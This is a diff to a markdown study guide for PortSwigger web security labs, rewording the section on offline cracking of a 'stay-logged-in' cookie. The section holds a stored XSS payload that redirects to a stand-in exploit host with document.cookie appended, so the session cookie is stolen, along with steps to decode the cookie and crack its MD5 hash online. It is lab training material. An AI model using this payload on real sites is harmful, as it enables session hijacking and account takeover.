@@ -885,7 +885,7 @@ Sec-Ch-Ua-Platform: "Linux"
   
 ### Stay-logged-in Offline Crack  
   
->The blog application comment function is vulnerable to stored XSS, use the below to send the Carlos session cookie value to exploit server.  
+>The blog application comment function is vulnerable to [stored XSS](#stored-xss), use the below payload in blog comment to send the session cookie of Carlos to the exploit server.  
 
 ```
 <script>
@@ -893,7 +893,9 @@ document.location='https://EXPLOIT.net/StealCookie='+document.cookie
 </script>
 ```  
   
->Base64 decode the ```stay-logged-in``` cookie value and use online **MD5** hash crack station database.  
+>Base64 decode the ```stay-logged-in``` cookie value and use an online **MD5** hash crack station database.  
+
+![stay-logged-in offline](images/stay-logged-in-offline.png)  
 
 [PortSwigger Lab: Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)  
 
